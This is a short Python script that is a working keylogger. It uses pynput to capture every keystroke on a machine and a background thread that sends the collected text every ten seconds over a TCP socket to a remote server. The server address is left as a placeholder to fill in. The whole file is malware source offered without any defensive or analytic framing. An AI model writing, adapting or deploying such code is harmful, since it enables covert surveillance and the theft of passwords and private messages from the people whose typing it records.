import socket
import pynput.keyboard
import threading
import time
import platform

log = ""
server_ip = 'YOUR IP ADDR'
server_port = 8080
log_interval = 10  # Interval to send logs in seconds

def callback(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "\n"
        else:
            log += f" [{key}] "

def send_logs():
    global log
    while True:
        time.sleep(log_interval)
        if log:
            try:
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((server_ip, server_port))
                client_socket.send(log.encode())
                client_socket.close()
                log = ""
            except Exception as e:
                print(f"Error sending logs: {e}")

def start_logging():
    keyboard_listener = pynput.keyboard.Listener(on_press=callback)
    with keyboard_listener:
        send_logs_thread = threading.Thread(target=send_logs, daemon=True)
        send_logs_thread.start()
        keyboard_listener.join()

if __name__ == "__main__":
    start_logging()
